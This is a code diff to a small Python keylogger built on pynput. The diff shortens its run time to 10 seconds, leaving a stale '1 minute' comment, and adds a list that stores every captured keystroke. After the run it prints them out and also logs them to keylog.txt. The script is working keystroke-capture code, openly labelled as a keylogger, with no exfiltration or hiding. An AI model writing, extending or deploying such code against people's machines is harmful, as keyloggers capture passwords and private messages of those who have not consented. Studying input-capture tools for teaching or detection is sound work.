@@ -9,24 +9,35 @@ import time # Import the time module
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 # Define the duration for the keylogger to run (in seconds)
-RUN_DURATION_SECONDS = 60 # 1 minute
+RUN_DURATION_SECONDS = 10 # 1 minute
+
+# Create a list to store keystrokes
+keystroke_list = []
 
 def on_press(key):
     """
     This function is called when a key is pressed.
-    It logs the key press to the 'keylog.txt' file.
+    It logs the key press to the 'keylog.txt' file and adds it to a list.
     Special keys like Space, Enter, Shift, etc., are explicitly named.
     """
     try:
-        logging.info(str(key.char))
+        keystroke = str(key.char)
+        logging.info(keystroke)
+        keystroke_list.append(keystroke)
     except AttributeError:
         # Handle special keys (e.g., Space, Enter, Shift)
         if key == Key.space:
-            logging.info(" ")
+            keystroke = " "
+            logging.info(keystroke)
+            keystroke_list.append(keystroke)
         elif key == Key.enter:
-            logging.info("\n")
+            keystroke = "\n"
+            logging.info(keystroke)
+            keystroke_list.append(keystroke)
         else:
-            logging.info(str(key))
+            keystroke = str(key)
+            logging.info(keystroke)
+            keystroke_list.append(keystroke)
 
 # The on_release function is no longer needed to stop the logger,
 # as it will now stop automatically after a set duration.
@@ -42,7 +53,7 @@ def on_release(key):
 
 
 print(f"Keylogger started. It will run for {RUN_DURATION_SECONDS} seconds.")
-print("Keystrokes will be logged to 'keylog.txt'.")
+print("Keystrokes will be logged to 'keylog.txt' and stored in a list.")
 
 # Set up the listener for keyboard events
 with Listener(on_press=on_press, on_release=on_release) as listener:
@@ -52,3 +63,11 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join(timeout=RUN_DURATION_SECONDS)
 
 print("Keylogger stopped after the specified duration.")
+print(f"\nTotal keystrokes captured: {len(keystroke_list)}")
+print("\nKeystroke list:")
+print(keystroke_list)
+
+# Create a string from the list for easier reading
+keystroke_string = ''.join(keystroke_list)
+print(f"\nKeystrokes as string:")
+print(keystroke_string)
